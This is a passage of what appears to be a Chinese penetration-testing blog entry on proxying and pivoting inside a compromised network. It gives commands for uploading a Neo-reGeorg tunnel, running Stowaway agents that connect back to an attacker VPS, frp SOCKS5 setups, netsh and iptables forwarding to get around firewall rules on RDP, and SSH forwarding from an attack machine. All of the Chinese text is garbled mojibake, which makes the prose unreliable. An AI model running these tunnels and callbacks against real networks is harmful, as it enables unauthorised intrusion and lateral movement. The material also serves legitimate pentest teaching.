‡"></a>æ­£å‘ä»£ç†æ­å»ºâ€“VPSèƒ½è®¿é—®ç›®æ ‡</h2><h3 id="Neo-reGeorg"><a href="#Neo-reGeorg" class="headerlink" title="Neo-reGeorg"></a>Neo-reGeorg</h3><ul><li><p>ç”ŸæˆæœåŠ¡ç«¯</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python neoreg.py generate -k password</span><br></pre></td></tr></table></figure></li><li><p>ä¸Šä¼ å¯¹åº”çš„tunnelè‡³ç›®æ ‡ä¸»æœº</p></li><li><p>åœ¨æœ¬åœ°å»ºç«‹Socks5ä»£ç†</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python neoreg.py -k password -u http://xx/tunnel.php</span><br></pre></td></tr></table></figure></li></ul><h2 id="å¤šçº§ä»£ç†"><a href="#å¤šçº§ä»£ç†" class="headerlink" title="å¤šçº§ä»£ç†"></a>å¤šçº§ä»£ç†</h2><h3 id="åœºæ™¯"><a href="#åœºæ™¯" class="headerlink" title="åœºæ™¯"></a>åœºæ™¯</h3><p><img src="/../images/b197db7d5642aacd23fe8b42fd65cd15.png" alt="img"></p><h3 id="Stowaway"><a href="#Stowaway" class="headerlink" title="Stowaway"></a>Stowaway</h3><p><a href="https://github.com/ph4ntonn/Stowaway">ph4ntonn&#x2F;Stowaway: ğŸ‘»Stowaway â€“ Multi-hop Proxy Tool for pentesters (github.com)</a></p><p><strong>æ§åˆ¶ç«¯VPS</strong></p><ul><li><p>å¼€å¯ç›‘å¬</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># é»˜è®¤ç›‘å¬0.0.0.0ï¼Œ-sä¸ºå¯†ç </span></span><br><span class="line">./linux_x64_admin -l 8000 -s 123</span><br></pre></td></tr></table></figure></li><li><p>èŠ‚ç‚¹ç®¡ç†</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">detailå±•ç¤ºåœ¨çº¿èŠ‚ç‚¹çš„è¯¦ç»†ä¿¡æ¯</span><br><span class="line">topoå±•ç¤ºåœ¨çº¿èŠ‚ç‚¹çš„çˆ¶å­å…³ç³»</span><br><span class="line">useä½¿ç”¨æŸä¸ªagent</span><br><span class="line"><span class="built_in">exit</span>é€€å‡º</span><br></pre></td></tr></table></figure></li></ul><p><strong>ç¬¬ä¸€å±‚å†…ç½‘</strong></p><p>win2012-1è¿æ¥VPSç«¯å£</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># --reconnecté‡è¿é—´éš”æ—¶é—´</span></span><br><span class="line">./windows_x64_agent.exe -c 192.168.125.134:8000 -s 123 --reconnect 8</span><br></pre></td></tr></table></figure><p>æ§åˆ¶ç«¯VPS</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use 0 <span class="comment"># è¿›å…¥win2012-1èŠ‚ç‚¹</span></span><br><span class="line">socks 7777 admin admin <span class="comment"># åˆ›å»ºç¬¬ä¸€å±‚å†…ç½‘ä»£ç†</span></span><br></pre></td></tr></table></figure><p><strong>ç¬¬äºŒå±‚å†…ç½‘</strong></p><p>æ§åˆ¶ç«¯VPS</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use 0 <span class="comment"># è¿›å…¥win2012-1èŠ‚ç‚¹</span></span><br><span class="line">listen</span><br></pre></td></tr></table></figure><p><img src="/../images/362ce4a074848570144ecb77cd0e723b.png" alt="img"></p><p>win7è¿æ¥win2012-1ç«¯å£</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># --reconnecté‡è¿é—´éš”æ—¶é—´</span></span><br><span class="line">./windows_x64_agent.exe -c 192.168.10.9:10000 -s 123 --reconnect 8</span><br></pre></td></tr></table></figure><h3 id="Frp-1"><a href="#Frp-1" class="headerlink" title="Frp"></a>Frp</h3><p><strong>ç¬¬ä¸€å±‚å†…ç½‘</strong></p><p><strong>æœåŠ¡ç«¯ï¼ˆVPSï¼‰</strong></p><p>é…ç½®<code>frps.ini</code></p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span> <span class="comment"># å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯é€šä¿¡çš„ç«¯å£</span></span><br></pre></td></tr></table></figure><p>å¯åŠ¨</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">nohup</span> ./frps -c frps.ini &amp;</span><br></pre></td></tr></table></figure><p><strong>å®¢æˆ·ç«¯ï¼ˆWin2012-1ï¼‰</strong></p><p>é…ç½®<code>frpc.ini</code></p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> =  <span class="number">192.168</span>.<span class="number">125.134</span> <span class="comment"># æœåŠ¡ç«¯IP</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span> <span class="comment">#  é€šä¿¡ç«¯å£</span></span><br><span class="line"></span><br><span class="line"><span class="section">[socks5_proxy]</span></span><br><span class="line"><span class="attr">type</span> = tcp </span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">8888</span> <span class="comment"># æœåŠ¡ç«¯ä»£ç†ç«¯å£</span></span><br><span class="line"><span class="attr">plugin</span> = socks5</span><br><span class="line"><span class="attr">use_encryption</span> = <span class="literal">true</span>  <span class="comment"># æ˜¯å¦åŠ å¯†</span></span><br><span class="line"><span class="attr">use_compression</span> = <span class="literal">true</span> <span class="comment"># æ˜¯å¦å‹ç¼©</span></span><br></pre></td></tr></table></figure><p><strong>ç¬¬äºŒå±‚å†…ç½‘</strong></p><p><strong>Win2012-1</strong></p><p>é…ç½®<code>frps.ini</code></p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_addr</span> = <span class="number">192.168</span>.<span class="number">10.2</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span></span><br></pre></td></tr></table></figure><p>é…ç½®<code>frpc.ini</code></p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> =  <span class="number">192.168</span>.<span class="number">125.134</span> <span class="comment"># æœåŠ¡ç«¯IP</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span> <span class="comment">#  é€šä¿¡ç«¯å£</span></span><br><span class="line"></span><br><span class="line"><span class="section">[socks5_proxy]</span></span><br><span class="line"><span class="attr">type</span> = tcp </span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">8888</span> <span class="comment"># æœåŠ¡ç«¯ä»£ç†ç«¯å£</span></span><br><span class="line"><span class="attr">use_encryption</span> = <span class="literal">true</span>  <span class="comment"># æ˜¯å¦åŠ å¯†</span></span><br><span class="line"><span class="attr">use_compression</span> = <span class="literal">true</span> <span class="comment"># æ˜¯å¦å‹ç¼©</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># plugin = socks5 # ä¸èƒ½åŠ ä¸Šè¿™ä¸ª</span></span><br><span class="line"><span class="comment">#ç›¸è¾ƒäºä¸€çº§ä»£ç†ï¼Œå¢åŠ å¦‚ä¸‹ä»£ç†æœåŠ¡å™¨frps.ini</span></span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">192.168</span>.<span class="number">10.2</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">7777</span></span><br></pre></td></tr></table></figure><p>å¯åŠ¨</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">start/b C:\tmp\frps.exe -c frps.ini</span><br><span class="line">start/b C:\tmp\frpc.exe -c frpc.ini</span><br></pre></td></tr></table></figure><p><strong>win7</strong></p><p>é…ç½®<code>frpc.ini</code></p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">192.168</span>.<span class="number">125.134</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="section">[socks5_proxy]</span></span><br><span class="line"><span class="attr">type</span> = tcp </span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">8888</span> <span class="comment"># æœåŠ¡ç«¯ä»£ç†ç«¯å£</span></span><br><span class="line"><span class="attr">use_encryption</span> = <span class="literal">true</span>  <span class="comment"># æ˜¯å¦åŠ å¯†</span></span><br><span class="line"><span class="attr">use_compression</span> = <span class="literal">true</span> <span class="comment"># æ˜¯å¦å‹ç¼©</span></span><br><span class="line"><span class="attr">plugin</span> = socks5</span><br></pre></td></tr></table></figure><h1 id="ç«¯å£è½¬å‘"><a href="#ç«¯å£è½¬å‘" class="headerlink" title="ç«¯å£è½¬å‘"></a>ç«¯å£è½¬å‘</h1><h2 id="å¸¸è§åœºæ™¯"><a href="#å¸¸è§åœºæ™¯" class="headerlink" title="å¸¸è§åœºæ™¯"></a>å¸¸è§åœºæ™¯</h2><ul><li><p><strong>ç›®æ ‡æœ‰å…¬ç½‘IP</strong></p><p><img src="/../images/image-20231015134119999.png" alt="image-20231015134119999"></p><p>â€‹å‡è®¾æ­¤æ—¶å·²ç»è·å–äº†Windows Server 2012çš„æ§åˆ¶æƒ,éœ€è¦ç™»å½•å…¶è¿œç¨‹æ¡Œé¢æŸ¥çœ‹æƒ…å†µï¼Œä½†æ˜¯é˜²ç«å¢™å¯¹3389ç«¯å£åšäº†é™åˆ¶ï¼Œä¸å…è®¸å¤–ç½‘æœºå™¨å¯¹3389ç«¯å£è¿›è¡Œè¿æ¥ã€‚é‚£ä¹ˆï¼Œé€šè¿‡ç«¯å£è½¬å‘ï¼Œå¯ä»¥å°†3389ç«¯å£è½¬å‘åˆ°å…¶ä»–é˜²ç«å¢™å…è®¸çš„ç«¯å£ä¸Šï¼Œå¦‚4444ç«¯å£ã€‚</p><p>â€‹æ•ˆæœï¼šç»•è¿‡é˜²ç«å¢™é™åˆ¶ï¼Œé€šè¿‡4444ç«¯å£è¿›è¡ŒRDPè¿œç¨‹è¿æ¥</p></li><li><p><strong>å†…ç½‘ä¸»æœºç«¯å£è½¬å‘åˆ°DMZåŒºä¸»æœºç«¯å£</strong></p><p><img src="/../images/image-20231015134055635.png" alt="image-20231015134055635"></p><p>â€‹å‡è®¾å·²ç»è·å–Windows Server 2012çš„æ§åˆ¶æƒï¼Œç»è¿‡ä¿¡æ¯æ”¶é›†ï¼Œè·å¾—å†…ç½‘ä¸­MySQLæœåŠ¡å™¨çš„SSHç™»å½•å‡­æ®ï¼Œæ¥ä¸‹æ¥éœ€è¦ç™»å½•è¿™å°æœåŠ¡å™¨ã€‚ä½†æ˜¯æœåŠ¡å™¨ä½äºå†…ç½‘ï¼Œæ— æ³•ç›´æ¥é€šè¿‡IPåœ°å€è¿›è¡Œè®¿é—®ï¼Œæ‰€ä»¥éœ€è¦é€šè¿‡ç«¯å£æ˜ å°„ï¼Œå°† MySQLæœåŠ¡å™¨çš„22ç«¯å£æ˜ å°„åˆ°Windows Server 2012ä¸Šçš„ç«¯å£å¦‚2222ã€‚</p><p>â€‹æ•ˆæœï¼šè®¿é—®DMZåŒºçš„Windows Server 2012çš„2222ç«¯å£å®è´¨ä¸Šæ˜¯è®¿é—®å†…ç½‘MySqlæœåŠ¡å™¨çš„22ç«¯å£</p></li><li><p><strong>ç›®æ ‡æ— å…¬ç½‘IP</strong></p><p><img src="/../images/image-20231015134450143.png" alt="image-20231015134450143"></p><p>â€‹å‡è®¾å·²ç»è·å– Windows Server 2012çš„æ§åˆ¶æƒï¼Œéœ€è¦ç™»å½•å…¶è¿œç¨‹æ¡Œé¢æŸ¥çœ‹æƒ…å†µï¼Œä½†æ˜¯Windows Server 2012æ²¡æœ‰å…¬ç½‘IPåœ°å€,æ— æ³•ç›´é€šè¿‡IPåœ°å€è¿›è¡Œè®¿é—®,æ‰€ä»¥éœ€è¦å…¬ç½‘VPSç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œå°†Windows Server 2012çš„3389ç«¯å£è½¬å‘åˆ°VPSçš„ç«¯å£å¦‚4444ä¸Šã€‚</p><p>â€‹æ•ˆæœï¼šè®¿é—®VPSçš„4444ç«¯å£å®è´¨ä¸Šæ˜¯è®¿é—®Windows Server 2012çš„3389ç«¯å£</p></li></ul><h2 id="å¦‚ä½•è½¬å‘"><a href="#å¦‚ä½•è½¬å‘" class="headerlink" title="å¦‚ä½•è½¬å‘"></a>å¦‚ä½•è½¬å‘</h2><h3 id="Windows-netsh-ç«¯å£è½¬å‘ï¼ˆåŒç½‘å¡ç”¨ï¼‰"><a href="#Windows-netsh-ç«¯å£è½¬å‘ï¼ˆåŒç½‘å¡ç”¨ï¼‰" class="headerlink" title="Windows netsh ç«¯å£è½¬å‘ï¼ˆåŒç½‘å¡ç”¨ï¼‰"></a>Windows netsh ç«¯å£è½¬å‘ï¼ˆåŒç½‘å¡ç”¨ï¼‰</h3><p><code>netsh</code>ä»…æ”¯æŒTCPåè®®ï¼Œ é€‚ç”¨äº<strong>åŒç½‘å¡</strong>æœåŠ¡å™¨</p><p>å°†å†…ç½‘çš„3389ç«¯å£è½¬å‘åˆ°å¤–ç½‘çš„6666ç«¯å£ä¸Šï¼Œå®ç°è®¿é—®å¤–ç½‘çš„6666ç«¯å£å³è®¿é—®å†…ç½‘çš„3389ç«¯å£</p><p><strong>å¯åŠ¨è½¬å‘</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#æŸ¥çœ‹ç°æœ‰è§„åˆ™</span></span><br><span class="line">netsh interface portproxy show all</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ·»åŠ è½¬å‘è§„åˆ™</span></span><br><span class="line">netsh interface portproxy <span class="built_in">set</span> v4tov4 listenaddress=å¤–ç½‘IP listenport=6666 connectaddress=å†…ç½‘IP connectport=3389</span><br></pre></td></tr></table></figure><p><strong>å–æ¶ˆè½¬å‘</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#åˆ é™¤è½¬å‘è§„åˆ™</span></span><br><span class="line">netsh interface portproxy delete v4tov4 listenport=6666</span><br><span class="line"></span><br><span class="line"><span class="comment">#xpéœ€è¦å®‰è£…ipv6</span></span><br><span class="line">netsh interface ipv6 install</span><br></pre></td></tr></table></figure><h3 id="Linux-iptables-ç«¯å£è½¬å‘ï¼ˆé«˜æƒé™ç”¨ï¼‰"><a href="#Linux-iptables-ç«¯å£è½¬å‘ï¼ˆé«˜æƒé™ç”¨ï¼‰" class="headerlink" title="Linux iptables ç«¯å£è½¬å‘ï¼ˆé«˜æƒé™ç”¨ï¼‰"></a>Linux iptables ç«¯å£è½¬å‘ï¼ˆé«˜æƒé™ç”¨ï¼‰</h3><p>å°†å†…ç½‘çš„3389ç«¯å£è½¬å‘åˆ°å¤–ç½‘çš„3389ç«¯å£ä¸Š</p><p><strong>ç¼–è¾‘é…ç½®æ–‡ä»¶</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/sysctl.conf</span><br><span class="line">net.ipv4.ip_forward = 1<span class="comment">#å¼€å¯IPè½¬å‘</span></span><br></pre></td></tr></table></figure><p><strong>å…³é—­æœåŠ¡</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service iptables stop</span><br></pre></td></tr></table></figure><p><strong>é…ç½®è§„åˆ™</strong></p><p>å‡è®¾</p><p>éœ€è¦è®¿é—®çš„å†…ç½‘åœ°å€ï¼š10.1.1.11ï¼ˆWindowsï¼‰</p><p>å†…ç½‘è¾¹ç•ŒwebæœåŠ¡å™¨ï¼š192.168.100.100ï¼ˆLinuxï¼‰</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING --dst 192.168.100.100 -p tcp --dport 3389 -j DNAT--to-destination 10.1.1.11:3389</span><br></pre></td></tr></table></figure><p>å°†ç›®æ ‡IPä¸º192.168.100.100ä¸”ç›®æ ‡ç«¯å£ä¸º3389çš„TCPæ•°æ®åŒ…ï¼Œè½¬å‘åˆ°10.1.1.11çš„3389ç«¯å£ã€‚</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -t nat -A POSTROUTING --dst 10.1.1.11 -p tcp --dport 3389 -j SNAT --to-source 192.168.100.100</span><br></pre></td></tr></table></figure><p>å°†ç›®æ ‡IPä¸º10.1.1.11ä¸”ç›®æ ‡ç«¯å£ä¸º3389çš„TCPæ•°æ®åŒ…ï¼Œå‘é€å‡ºå»æ—¶ï¼Œå°†æºIPåœ°å€æ”¹ä¸º192.168.100.100</p><p>(ç›¸å½“äºå®ç°äº†ç½‘ç»œåœ°å€è½¬æ¢ï¼ˆNATï¼‰ï¼Œå°†å†…éƒ¨ç§æœ‰ç½‘ç»œä¸­çš„IPåœ°å€è½¬æ¢ä¸ºå…¬ç½‘IPåœ°å€)</p><p><strong>ä¿å­˜å¹¶é‡å¯æœåŠ¡</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service iptables save &amp;&amp; service iptables start</span><br></pre></td></tr></table></figure><h1 id="SSHç«¯å£è½¬å‘"><a href="#SSHç«¯å£è½¬å‘" class="headerlink" title="SSHç«¯å£è½¬å‘"></a>SSHç«¯å£è½¬å‘</h1><blockquote><p>SSH ç«¯å£è½¬å‘åŠŸèƒ½èƒ½å¤Ÿå°†å…¶ä»– TCP ç«¯å£çš„ç½‘ç»œæ•°æ®é€šè¿‡ SSH é“¾æ¥æ¥è½¬å‘ï¼Œå¹¶ä¸”è‡ªåŠ¨æä¾›äº†ç›¸åº”çš„åŠ å¯†åŠè§£å¯†æœåŠ¡ã€‚å…¶å®è¿™ä¸€æŠ€æœ¯å°±æ˜¯æˆ‘ä»¬å¸¸å¸¸å¬è¯´çš„éš§é“(tunnel)æŠ€æœ¯ï¼ŒåŸå› æ˜¯ SSH ä¸ºå…¶ä»– TCP é“¾æ¥æä¾›äº†ä¸€ä¸ªå®‰å…¨çš„é€šé“æ¥è¿›è¡Œä¼ è¾“ã€‚</p></blockquote><p>æ¨èé˜…è¯»ï¼š<a href="https://lotabout.me/2019/SSH-Port-Forwarding/">SSH ç«¯å£è½¬å‘æ•™ç¨‹ | ä¸‰ç‚¹æ°´ (lotabout.me)</a></p><h2 id="æœ¬åœ°è½¬å‘"><a href="#æœ¬åœ°è½¬å‘" class="headerlink" title="æœ¬åœ°è½¬å‘"></a>æœ¬åœ°è½¬å‘</h2><p><strong>æœ¬åœ°ç«¯å£è½¬å‘æŒ‡çš„æ˜¯åœ¨æœ¬æœºä¸Šå‘èµ·è¯·æ±‚ï¼Œç”± ssh client è½¬å‘åˆ°è¿œç¨‹çš„æœºå™¨ä¸Š</strong></p><p><img src="/../images/local-port-forwarding-two.svg" alt="img"></p><p>å‡è®¾Aä¸ºæ”»å‡»æœºVPSï¼ŒBä¸ºDMZåŒºä¸»æœºï¼ŒCä¸ºå†…ç½‘ä¸»æœºï¼ŒAèƒ½è®¿é—®B</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ssh clientå³æ”»å‡»æœºVPSæ‰§è¡Œ</span></span><br><span class="line">ssh -CfNg -L 1234:ip_c:3389 user_b@ip_b</span><br></pre></td></tr></table></figure><p>å‚æ•°è§£é‡Š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-C é€‰é¡¹ä½¿ç”¨å‹ç¼©ç®—æ³•è¿›è¡Œæ•°æ®ä¼ è¾“ï¼Œå¯ä»¥æé«˜ä¼ è¾“æ•ˆç‡ã€‚</span><br><span class="line">-f é€‰é¡¹å°†SSHä¼šè¯æ”¾å…¥åå°è¿è¡Œã€‚</span><br><span class="line">-N é€‰é¡¹è¡¨ç¤ºä¸æ‰§è¡Œè¿œç¨‹å‘½ä»¤ï¼Œä»…ç”¨äºå»ºç«‹éš§é“ã€‚</span><br><span class="line">-g é€‰é¡¹å…è®¸å…¶ä»–ä¸»æœºè¿æ¥è¯¥éš§é“ã€‚</span><br><span class="line">-L 1234:ip_c:3389 user_b@ip_b é€‰é¡¹æŒ‡å®šåœ¨æœ¬åœ°ç›‘å¬1234ç«¯å£ï¼Œå¹¶å°†æ‰€æœ‰é€šè¿‡è¯¥ç«¯å£çš„æµé‡è½¬å‘åˆ°ç›®æ ‡ä¸»æœºCçš„3389ç«¯å£ã€‚</span><br></pre></td></tr></table></figure><p>å®ç°äº†è®¿é—®æ”»å‡»æœº1234ç«¯å£å®è´¨ä¸Šæ˜¯è®¿é—®å†…ç½‘ä¸»æœºCçš„3389ç«¯å£</p><h2 id="è¿œç¨‹è½¬å‘"><a href="#è¿œç¨‹è½¬å‘" class="headerlink" title="è¿œç¨‹è½¬å‘"></a>è¿œç¨‹è½¬å‘</h2><p>æŠŠæœ€ç»ˆè¯·æ±‚çš„å‘èµ·æ–¹ï¼ˆæœºå™¨ Aï¼‰ä¸ºâ€œæœ¬åœ°â€ï¼ŒæœåŠ¡æ‰€åœ¨çš„æœºå™¨ B&#x2F;C ä¸ºâ€œè¿œç¨‹â€ï¼Œåœ¨æœ¬åœ°æœºå™¨ä¸Šæ‰§è¡Œ <code>ssh</code> å‘½ä»¤å°±ç§°ä¸ºâ€œæœ¬åœ°è½¬å‘â€ï¼Œåœ¨è¿œç¨‹æœºå™¨ä¸Šæ‰§è¡Œå‘½ä»¤å°±ç§°ä¸ºâ€œè¿œç¨‹è½¬å‘â€</p><p><img src="/../images/remote-port-forwarding.svg" alt="img"></p><p>å‡è®¾Aä¸ºæ”»å‡»æœºVPSï¼ŒBä¸ºDMZåŒºä¸»æœºï¼ŒCä¸ºå†…ç½‘ä¸»æœºï¼ŒAä¸èƒ½è®¿é—®Bï¼ŒBèƒ½è®¿é—®A</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ssh cilentå³DMZåŒºä¸»æœºæ‰§è¡Œ</span></span><br><span class="line">ssh -CfNg -R 9992:ip_c:3389 user_a@ip_a</span><br></pre></td></tr></table></figure><p>å‚æ•°è§£é‡Š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-R 9992:ip_c:3389 user_a@ip_a é€‰é¡¹æŒ‡å®šåœ¨è¿œç¨‹ä¸»æœºï¼ˆå³æ”»å‡»æœºvpsï¼‰ç›‘å¬9992ç«¯å£ï¼Œå¹¶å°†æ‰€æœ‰é€šè¿‡è¯¥ç«¯å£çš„æµé‡è½¬å‘åˆ°æœ¬åœ°çš„å†…ç½‘ä¸»æœºCçš„3389ç«¯å£ã€‚</span><br></pre></td></tr></table></figure><p>å®ç°äº†è®¿é—®æ”»å‡»æœº9992ç«¯å£å®é™…ä¸Šæ˜¯è®¿é—®å†…ç½‘ä¸»æœºCçš„3389ç«¯å£</p><h2 id="åŠ¨æ€è½¬å‘"><a href="#åŠ¨æ€è½¬å‘" class="headerlink" title="åŠ¨æ€è½¬å‘"></a>åŠ¨æ€è½¬å‘</h2><p>æœ¬åœ°è½¬å‘å’Œè¿œç¨‹è½¬å‘éƒ½åªè½¬å‘ä¸€ä¸ªç«¯å£ï¼ŒåŠ¨æ€è½¬å‘å¯ä»¥è½¬å‘æ‰€æœ‰ç«¯å£</p><p><img src="/../images/dynamic-port-forwarding.svg" alt="img"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ssh cilnetå³æ”»å‡»æœºVPSæ‰§è¡Œ</span></span><br><span class="line">ssh -qTfnN -D 1234 user_b@ip_b</span><br></pre></td></tr></table></figure><p>å‚æ•°è§£é‡Š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-q é€‰é¡¹è¡¨ç¤ºå®‰é™æ¨¡å¼ï¼Œå‡å°‘è¾“å‡ºä¿¡æ¯ã€‚</span><br><span class="line">-T é€‰é¡¹è¡¨ç¤ºä¸åˆ†é…ç»ˆç«¯ã€‚</span><br><span class="line">-f é€‰é¡¹å°†SSHä¼šè¯æ”¾å…¥åå°è¿è¡Œã€‚</span><br><span class="line">-n é€‰é¡¹è¡¨ç¤ºä¸æ‰§è¡Œè¿œç¨‹å‘½ä»¤ã€‚</span><br><span class="line">-N é€‰é¡¹è¡¨ç¤ºä¸æ‰§è¡Œè¿œç¨‹å‘½ä»¤ï¼Œä»…ç”¨äºå»ºç«‹éš§é“ã€‚</span><br><span class="line">-D 1080 é€‰é¡¹æŒ‡å®šåœ¨æœ¬åœ°ç›‘å¬1080ç«¯å£ï¼Œå¹¶å°†æµé‡é€šè¿‡SSHé€šé“è½¬å‘ã€‚</span><br></pre></td></tr></table></figure><p>åœ¨æœ¬åœ°å»ºç«‹ä¸€ä¸ªSSHåŠ¨æ€ç«¯å£è½¬å‘ï¼ˆSOCKSä»£ç†ï¼‰ï¼Œå°†æœ¬åœ°çš„1080ç«¯å£è®¾ç½®ä¸ºSOCKSä»£ç†æœåŠ¡ã€‚é€šè¿‡è¿™ä¸ªä»£ç†ï¼Œå¯ä»¥å°†æœ¬åœ°çš„ç½‘ç»œæµé‡é€šè¿‡SSHåŠ å¯†é€šé“è½¬å‘åˆ°è¿œç¨‹ä¸»æœºBä¸Šï¼Œä»è€Œè®¿é—®å†…ç½‘ä¸»æœºC</p><h1 id="å…¨å±€ä»£ç†æµé‡"><a href="#å…¨å±€ä»£ç†æµé‡" class="headerlink" title="å…¨å±€ä»£ç†æµé‡"></a>å…¨å±€ä»£ç†æµé‡</h1><ul><li>Linuxï¼šProxychinas</li><li>Windowsï¼šProxifier</li></ul><h1 id="é‡åˆ°çš„é—®é¢˜"><a href="#é‡åˆ°çš„é—®é¢˜" class="headerlink" title="é‡åˆ°çš„é—®é¢˜"></a>é‡åˆ°çš„é—®é¢˜</h1><p>reGeorgä¸Šä¼ çš„tunnelæ— æ³•è§£æ</p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
